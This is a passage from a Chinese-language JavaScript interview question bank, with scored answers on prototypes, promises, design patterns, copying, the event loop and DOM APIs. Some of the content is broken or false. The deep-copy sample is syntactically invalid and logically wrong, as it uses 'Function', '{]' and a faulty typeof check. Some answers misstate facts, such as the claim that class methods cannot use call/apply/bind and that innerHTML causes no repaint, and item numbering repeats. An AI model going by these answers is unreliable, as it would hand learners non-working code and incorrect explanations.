遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；</p>\\n</li>\\n<li><p>map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；</p>\\n</li>\\n</ul>\\n<h2>29. 原型链的终点是什么？如何打印出原型链的终点？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<pre><code class=\\"language-detail\\">\\n由于Object是构造函数，原型链终点是Object.prototype.__proto__，而Object.prototype.__proto__=== null // true，所以，原型链的终点是null。原型链上的所有原型都是对象，所有的对象最终都是由Object构造的，而Object.prototype的下一级是Object.prototype.__proto__。\\n</code></pre>\\n<h2>29. 如何获得对象非原型链上的属性？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>使用后hasOwnProperty()方法来判断属性是否属于原型链的属性：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">\\nfunction iterate(obj){\\n   var res=[];\\n   for(var key in obj){\\n        if(obj.hasOwnProperty(key))\\n           res.push(key+&#39;: &#39;+obj[key]);\\n   }\\n   return res;\\n} \\n</code></pre>\\n<h2>30. Promise.all和Promise.race的区别的使用场景？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Promise.all Promise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值。</p>\\n</li>\\n<li><p>Promise.all中传入的是数组，返回的也是是数组，并且会将进行映射，传入的promise对象返回的值是按照顺序在数组中排列的，但是注意的是他们执行的顺序并不是按照顺序的，除非可迭代对象为空。</p>\\n</li>\\n<li><p>需要注意，Promise.all获得的成功结果的数组里面的数据顺序和Promise.all接收到的数组顺序是一致的，这样当遇到发送多个请求并根据请求顺序获取和使用数据的场景，就可以使用Promise.all来解决。</p>\\n</li>\\n<li><p>Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。当要做一件事，超过多长时间就不做了，可以用这个方法来解决：</p>\\n</li>\\n</ul>\\n<h2>31. 匿名函数的典型应用场景是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>匿名函数可以在 IIFE 中使用，来封装局部作用域内的代码，以便其声明的变量不会暴露到全局作用域。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">(function () {\\n  // 一些代码。\\n})();\\n</code></pre>\\n<ul>\\n<li>匿名函数可以作为只用一次，不需要在其他地方使用的回调函数。当处理函数在调用它们的程序内部被定义时，代码具有更好地自闭性和可读性，可以省去寻找该处理函数的函数体位置的麻烦。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">\\nsetTimeout(function () {\\n  console.log(&#39;Hello world!&#39;);\\n}, 1000);\\n</code></pre>\\n<ul>\\n<li>匿名函数可以用于函数式编程或 Lodash（类似于回调函数）。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const arr = [1, 2, 3];\\nconst double = arr.map(function (el) {\\n  return el * 2;\\n});\\nconsole.log(double); // [2, 4, 6]\\n</code></pre>\\n<h2>32. 手写单例模式（创建模式）</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<pre><code class=\\"language-js\\">    let CreateSingleton = (function(){\\n       let instance;\\n       return function(name) {\\n           if (instance) {\\n               return instance;\\n           }\\n           this.name = name;\\n           return instance = this;\\n       }\\n    })();\\n    CreateSingleton.prototype.getName = function() {\\n       console.log(this.name);\\n    }\\n\\nlet Winner = new CreateSingleton(&#39;Winner&#39;);\\nlet Looser = new CreateSingleton(&#39;Looser&#39;);\\n​\\nconsole.log(Winner === Looser); // true\\nconsole.log(Winner.getName());  // &#39;Winner&#39;\\nconsole.log(Looser.getName());  // &#39;Winner&#39;\\n</code></pre>\\n<h2>33. 手写观察者模式（行为模式）</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<pre><code class=\\"language-js\\">const queuedObservers = new Set();\\nconst observe = fn =&gt; queuedObservers.add(fn);\\n​\\n​\\nconst observable = obj =&gt; new Proxy(obj, {\\n  set(target, key, value, receiver) {\\n    const result = Reflect.set(target, key, value, receiver);\\n    // notify\\n    queuedObservers.forEach(observer =&gt; observer());\\n    return result;\\n  }\\n});\\n\\nobj = observable({\\n  name:&#39;789&#39;\\n})\\n​\\nobserve(function test(){\\n  console.log(&#39;触发了&#39;)\\n})\\n​\\nobj.name =&quot;前端柒八九&quot;\\n</code></pre>\\n<h2>34. 手写发布订阅 （行为模式）</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<pre><code class=\\"language-js\\">class Observer {\\n  caches = {}; // 事件中心\\n  \\n  // eventName事件名-独一无二, fn订阅后执行的自定义行为\\n  on (eventName, fn){ \\n    this.caches[eventName] = this.caches[eventName] || [];\\n    this.caches[eventName].push(fn);\\n  }\\n  \\n  // 发布 =&gt; 将订阅的事件进行统一执行\\n  emit (eventName, data) { \\n    if (this.caches[eventName]) {\\n      this.caches[eventName]\\n      .forEach(fn =&gt; fn(data));\\n    }\\n  }\\n  // 取消订阅 =&gt; 若fn不传, 直接取消该事件所有订阅信息\\n  off (eventName, fn) { \\n    if (this.caches[eventName]) {\\n      const newCaches = fn \\n        ? this.caches[eventName].filter(e =&gt; e !== fn) \\n        : [];\\n      this.caches[eventName] = newCaches;\\n    }\\n  }\\n​\\n}\\n\\n    ob = new Observer();\\n    ​\\n    l1 = (data) =&gt; console.log(`l1_${data}`)\\n    l2 = (data) =&gt; console.log(`l2_${data}`)\\n    ​\\n    ob.on(&#39;event1&#39;,l1)\\n    ob.on(&#39;event1&#39;,l2)\\n    ​\\n    //发布订阅\\n    ob.emit(&#39;event1&#39;,789) \\n    // l1_789\\n    // l2_789\\n    ​\\n    // 取消，订阅l1\\n    ob.off(&#39;event1&#39;,l1)\\n    ​\\n    ob.emit(&#39;event1&#39;,567)\\n</code></pre>\\n<h2>35. 深浅拷贝的区别？如何实现一个深拷贝？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>深浅拷贝通常只针对引用类型</p>\\n</li>\\n<li><p>浅拷贝：只拷贝一层对象，复制这一层对象中的原始值，如果有引用类型的话，就复制它的指针</p>\\n</li>\\n<li><p>深拷贝：层层拷贝，所有类型的属性值都会被复制，原对象的修改不会影响拷贝后的对象 JSON.parse(JSON.stringify(obj)) --- 无法处理 undefined Symbol function -- 无法处理循环引用</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">\\nFunction  shallowCopy(obj){\\n      let newObj = {]\\n      for( let key in  obj ){\\n        if(obj.hasOwnProperty(key)){ \\n        //hasOwnProperty检测对象自己身上方法而不是原先链上的\\n          newObj[key]=obj[key]\\n        }\\n      }\\n      return  newObj\\n} \\n// 咱们会浅拷贝当然还要深拷贝呀  开始\\nFunction  shallowCopy(obj){\\n      let newObj = {]\\n      for( let key in  obj ){\\n        if(obj.hasOwnProperty(key)){ \\n        //hasOwnProperty检测对象自己身上方法而不是原先链上的\\n        if  ( typeof(obj[key])!==obj||obj[key]===null){\\n           newObj[key]=obj[key]\\n        }else{\\n           newObj[key]=shallowCopy(obj[key])\\n        }  \\n        }\\n      }\\n      return  newObj\\n}\\n</code></pre>\\n<h2>36. 说说Ajax的原理</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>Async Javascript and XML ，是一种异步js和网页交互的技术，可以实现不刷新网页就跟服务器交换数据，更新页面。</p>\\n</li>\\n<li><p>创建XHR实例对象</p>\\n</li>\\n<li><p>调用实例对象中的open方法与服务器建立连接</p>\\n</li>\\n<li><p>调用实例对象中的send方法发送请求</p>\\n</li>\\n<li><p>监听onreadystatechange事件，通过判断readyState的值来获取到最终的数据</p>\\n</li>\\n<li><p>将数据更新到html页面</p>\\n</li>\\n</ul>\\n<h2>37. 什么是执行上下文和执行栈？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>变量或函数的执行上下文，决定了它们的行为以及可以访问哪些数据。每个上下文都有一个关联的变量对象，而这个上下文中定义的所有变量和函数都存在于这个对象上(如DOM中全局上下文关联的便是window对象)。</p>\\n</li>\\n<li><p>每个函数调用都有自己的上下文。当代码执行流进入函数时，函数的上下文被推到一个执行栈中。在函数执行完之后，执行栈会弹出该函数上下文，在其上的所有变量和函数都会被销毁，并将控制权返还给之前的执行上下文。 JS的执行流就是通过这个执行栈进行控制的。</p>\\n</li>\\n</ul>\\n<h2>38. 作用域和执行上下文的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>函数的执行上下文只在函数被调用时生成，而其作用域在创建时已经生成；</p>\\n</li>\\n<li><p>函数的作用域会包含若干个执行上下文(有可能是零个，当函数未被调用时)。</p>\\n</li>\\n</ul>\\n<h2>39. require/import之间的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>require是CommonJS语法，import是ES6语法；</p>\\n</li>\\n<li><p>require只在后端服务器支持，import在高版本浏览器及Node中都可以支持；</p>\\n</li>\\n<li><p>require引入的是原始导出值的复制，import则是导出值的引用；</p>\\n</li>\\n<li><p>require时运行时动态加载，import是静态编译；</p>\\n</li>\\n<li><p>require调用时默认不是严格模式，import则默认调用严格模式.</p>\\n</li>\\n</ul>\\n<h2>40. script标签中defer和async的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>defer 和 async属性都是去异步加载外部的JS脚本文件，它们都不会阻塞页面HTML的解析，其区别如下：</p>\\n</li>\\n<li><p>执行顺序： 多个带async属性的标签，不能保证加载的顺序；多个带defer属性的标签，按照加载顺序执行；</p>\\n</li>\\n<li><p>脚本是否并行执行：async属性，表示 后续文档的加载和执行与js脚本的加载和执行是并行进行的，即异步执行；defer属性，加载后续文档的过程和js脚本的加载(此时仅加载不执行)是并行进行的(异步)，js脚本需要等到文档所有元素解析完成之后才执行，DOMContentLoaded事件触发执行之前。</p>\\n</li>\\n<li><p>没有 defer 或 async，浏览器会立即加载并执行指定的脚本，之前加载到一半的HTML页面会停止下来，被阻塞加载。</p>\\n</li>\\n<li><p>有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行，将script变成异步，当scripet异步解析完成后，如果HTML页面还没有完成解析，又会继续阻塞页面的解析。</p>\\n</li>\\n<li><p>有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行，将script变成异步。但是 script.js 的执行要在所有元素解析完成之后，类似于将这个script放在了页面的底部。</p>\\n</li>\\n</ul>\\n<h2>41. class和function的区别?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>相同点：1. 函数作为构造函数</p>\\n</li>\\n<li><p>不同点：</p>\\n</li>\\n<li><p>class构造函数必须使用new操作符。</p>\\n</li>\\n<li><p>class声明不可以提升。</p>\\n</li>\\n<li><p>class不可以用call、apply、bind改变this指向。</p>\\n</li>\\n</ul>\\n<h2>42. 为什么0.1+0.2 ! == 0.3，如何让其相等 ？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>计算机是通过二进制的方式存储数据的，所以计算机计算0.1+0.2的时候，实际上是计算的两个数的二进制的和。0.1的二进制是0.0001100110011001100...（1100循环），0.2的二进制是：0.00110011001100...（1100循环），这两个数的二进制都是无限循环的数。那JavaScript是如何处理无限循环的二进制小数呢？</p>\\n</li>\\n<li><p>toFixed(num) 方法可把 Number 四舍五入为指定小数位数的数字。</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">(n1 + n2).toFixed(2) // 注意，toFixed为四舍五入\\n</code></pre>\\n<h2>43. JS严格模式有什么特点？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>全局变量必须声明</p>\\n</li>\\n<li><p>禁止this指向windows</p>\\n</li>\\n<li><p>函数参数名称不能重复</p>\\n</li>\\n<li><p>禁止使用with语句</p>\\n</li>\\n<li><p>创建eval作用域（单独作用域）</p>\\n</li>\\n</ul>\\n<h2>44. js 中const真的不能修改吗？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li>const定义的基本类型不能改变，但是定义的引用类型中的 数组 与 对象 可以通过修改对象属性改变。 const使用建议：不要使用const定义 数组 或 对象 作为常量。</li>\\n</ul>\\n<h2>45. typeof与instanceof的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>返回结果类型不同：typeof会返回一个变量的基本类型，instanceof返回的是一个布尔值</p>\\n</li>\\n<li><p>判断范围不同：instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了function 类型以外，其他的也无法判断</p>\\n</li>\\n</ul>\\n<h2>46. 如何判断一个变量是不是数组？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>instanceof Array</p>\\n</li>\\n<li><p>Array.isArray();</p>\\n</li>\\n<li><p>Object.prototype.toString.call();</p>\\n</li>\\n</ul>\\n<h2>47. class的原型本质怎么理解？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>原型：所有的class都有显示原型，每个实例都有隐式原型，实例的隐式原型等于对应class的显示原型，非基本属性的class的隐式原型等于其继承的class的显示原型。</p>\\n</li>\\n<li><p>原型链：每一个对象都有一个隐式原型叫__proto__，它的指向是构造函数的原型对象。当查找某个属性或方法时，先从自身上查找，没有找到会沿着__proto_找到构造函数的原型对象，仍然没有找到会继续沿着__proto__向上查找到它构造函数原型对象的原型对象，直到找到顶级对象object为null，由此形成的链条为原型链。</p>\\n</li>\\n</ul>\\n<h2>48. ES5、ES6 如何实现继承?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>ES5：①原型链继承 ②构造函数继承 ③组合继承 ④寄生组合继承</p>\\n</li>\\n<li><p>ES6：ES6 中引入了 class 关键字， class 可以通过 extends 关键字实现继承。ES6的继承中super是用来①调用父类函数 ②指向父类的原型</p>\\n</li>\\n</ul>\\n<h2>49. 宏任务有哪些？微任务有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>JavaScript 运行时的事件循环机制中，任务分为宏任务（macro task）和微任务（micro task）。</p>\\n</li>\\n<li><p>常见的宏任务有：</p>\\n</li>\\n<li><p>setTimeout 和 setInterval 的回调函数</p>\\n</li>\\n<li><p>DOM 事件</p>\\n</li>\\n<li><p>XMLHttpRequest 中的readystatechange事件</p>\\n</li>\\n<li><p>requestAnimationFrame 中的回调函数</p>\\n</li>\\n<li><p>I/O 操作和网络请求的回调函数</p>\\n</li>\\n<li><p>Node.js 中的文件读写操作的回调函数</p>\\n</li>\\n<li><p>Node.js 中的进程事件</p>\\n</li>\\n<li><p>常见的微任务有：</p>\\n</li>\\n<li><p>Promise.then 和 Promise.catch 的回调函数</p>\\n</li>\\n<li><p>MutationObserver 的回调函数</p>\\n</li>\\n<li><p>process.nextTick 函数</p>\\n</li>\\n<li><p>Object.observe 的回调函数</p>\\n</li>\\n</ul>\\n<h2>50. DOM操作的常用API</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>创建：createElement</p>\\n</li>\\n<li><p>插入：appendChild</p>\\n</li>\\n<li><p>删除：removeChild</p>\\n</li>\\n<li><p>获取子节点：childNodes</p>\\n</li>\\n<li><p>获取子节点：parentNodes</p>\\n</li>\\n<li><p>获取兄弟节点：nextSibling</p>\\n</li>\\n<li><p>获取兄弟节点：previousSibling</p>\\n</li>\\n<li><p>获取属性：getAttribute</p>\\n</li>\\n<li><p>设置属性：setAttribute</p>\\n</li>\\n<li><p>获取元素样式：style</p>\\n</li>\\n<li><p>获取元素属性：getAttribute</p>\\n</li>\\n<li><p>设置元素属性：setAttribute</p>\\n</li>\\n<li><p>获取元素类名：className</p>\\n</li>\\n<li><p>设置元素类名：className</p>\\n</li>\\n<li><p>获取元素内容：innerHTML</p>\\n</li>\\n</ul>\\n<h2>51. attribute和property（都是属性）的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>两者都有可能引起DOM重新渲染</p>\\n</li>\\n<li><p>property : 修改对象属性，不会体现到html结构中</p>\\n</li>\\n<li><p>attribute : 修改html属性，会改变html结构</p>\\n</li>\\n</ul>\\n<h2>52. 什么是事件冒泡？什么是事件代理？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>事件冒泡和事件代理都是JavaScript中处理事件的机制。</p>\\n</li>\\n<li><p>事件冒泡指的是当用户触发某个元素的事件时，该事件会先被触发该元素上，然后再逐级往上层元素传递，直至达到文档节点。简单来说，就是事件从子元素向父元素冒泡传递的过程。</p>\\n</li>\\n<li><p>事件代理，又称事件委托，是利用了事件冒泡机制，把事件绑定到父元素上，然后通过判断事件的target属性，来确定触发事件的元素是否是我们需要处理事件的元素，从而实现事件处理的目的。这种机制能够减少事件处理程序的数量，避免了为每一个节点添加事件处理程序，从而节省内存和提高程序的效率。</p>\\n</li>\\n</ul>\\n<h2>53. Ajax Fetch Axios的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Fetch：是一个具体的浏览器原生API，用于网络请求；它和xmlhttpRequest是一个级别的，但是其语法更加简洁，更加易用，并且支持Promise</p>\\n</li>\\n<li><p>Axios：是一个第三方库。内部可以通过XMLHttpRequest和Fetch来实现</p>\\n</li>\\n<li><p>Ajax：是一个概念，表示通过JavaScript进行异步网络请求的技术。</p>\\n</li>\\n</ul>\\n<h2>54. 描述cookie，localStorage，sessionStorage的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>cookie：存储在客户端，大小限制为4KB，有有效期，可以设置过期时间，默认为会话级别，即浏览器关闭后cookie失效。</p>\\n</li>\\n<li><p>localStorage：存储在客户端，大小限制为5MB，没有有效期，除非手动清除，否则一直存在。</p>\\n</li>\\n<li><p>sessionStorage：存储在客户端，大小限制为5MB，仅在当前会话有效，关闭浏览器后失效。</p>\\n</li>\\n<li><p>localStorage和sessionStorage的区别在于，localStorage的数据在浏览器关闭后依然存在，而sessionStorage的数据在浏览器关闭后就会失效。</p>\\n</li>\\n</ul>\\n<h2>55. 如何阻止事件冒泡，事件的默认行为？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>阻止事件冒泡：</p>\\n</li>\\n<li><p>event.stopPropagation();</p>\\n</li>\\n<li><p>IE：evnet.cancelBuddle = true;</p>\\n</li>\\n<li><p>阻止事件默认行为：</p>\\n</li>\\n<li><p>event.preventDefault();</p>\\n</li>\\n<li><p>IE： e.return Value = false;</p>\\n</li>\\n</ul>\\n<h2>56. document.write() 和 innerHTML 的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>document.write()是直接写入到页面的内容流，如果在写之前没有调用document.open()，浏览器会自动调用open()，每次写完关闭之后会重新调用该函数，会导致页面被重写；</p>\\n</li>\\n<li><p>innerHTML则是 DOM 页面元素的一个属性，代表该元素的html内容；</p>\\n</li>\\n<li><p>innerHTML将内容写入到某个DOM节点，不会导致页面重绘；</p>\\n</li>\\n<li><p>innerHTML在很多情况下都优于document.write()，原因在于其允许更精确的控制要刷新页面的那个部分</p>\\n</li>\\n</ul>\\n<h2>57. window load和document ready的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>window load：当整个页面及所有依赖资源如样式表和图片都已完成加载时，触发window load事件。</p>\\n</li>\\n<li><p>document ready：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，无需等待样式表、图像和子框架的加载完成。</p>\\n</li>\\n<li><p>window load事件是在页面加载完成后触发的，而document ready事件是在DOM加载完成后触发的，因此，document ready事件比window load事件更早触发。</p>\\n</li>\\n<li><p>因此，如果需要在页面加载完成后执行某些操作，可以使用window load事件；如果需要在DOM加载完成后执行某些操作，可以使用document ready事件。</p>\\n</li>\\n</ul>\\n<h2>58. Set、Map的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Set：是一种新的数据结构，类似于数组，但是成员的值都是唯一的，没有重复的值。</p>\\n</li>\\n<li><p>Map：是一种新的数据结构，类似于对象，但是键可以是任意类型。</p>\\n</li>\\n<li><p>Set和Map的区别在于，Set的键值是唯一的，而Map的键值可以是任意类型。</p>\\n</li>\\n</ul>\\n<h2>59. return，break，continue的区别是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>return 必须写在函数内部，遇到return后函数内部剩余的代码不再执行，直接返回；还可以使用return返回一个值给外面使用</p>\\n</li>\\n<li><p>break 跳出循环，剩余的循环不再执行</p>\\n</li>\\n<li><p>continue  跳出本次循环，剩余的循环继续执行</p>\\n</li>\\n</ul>\\n<h2>60. typeof NaN 的结果是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>NaN 指“不是一个数字”（not a number），NaN 是一个“警戒值”（sentinel value，有特殊用途的常规值），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">\\ntypeof NaN; // &quot;number&quot;\\n</code></pre>\\n<h2>61. 其他值到字符串的转换规则？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Null 和 Undefined 类型 ，null 转换为 &quot;null&quot;，undefined 转换为 &quot;undefined&quot;，</p>\\n</li>\\n<li><p>Boolean 类型，true 转换为 &quot;true&quot;，false 转换为 &quot;false&quot;。</p>\\n</li>\\n<li><p>Number 类型的值直接转换，不过那些超出字符表示范围的整数部分，则用十六进制表示。</p>\\n</li>\\n<li><p>Symbol 类型的值直接转换，但是只允许显式转换，如 String(sym)。</p>\\n</li>\\n<li><p>对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如&quot;[object Object]&quot;。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。</p>\\n</li>\\n</ul>\\n<h2>62. isNaN 和 Number.isNaN 函数的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。</p>\\n</li>\\n<li><p>函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，不会进行数据类型的转换，这种方法对于 NaN 的判断更为准确。</p>\\n</li>\\n</ul>\\n<h2>63.  || 和 &amp;&amp; 操作符的返回值？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>|| 和 &amp;&amp; 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。</p>\\n</li>\\n<li><p>对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。</p>\\n</li>\\n<li><p>&amp;&amp; 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。</p>\\n</li>\\n<li><p>|| 和 &amp;&amp; 返回它们其中一个操作数的值，而非条件判断的结果。</p>\\n</li>\\n</ul>\\n<h2>64. 为什么会有BigInt的提案？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 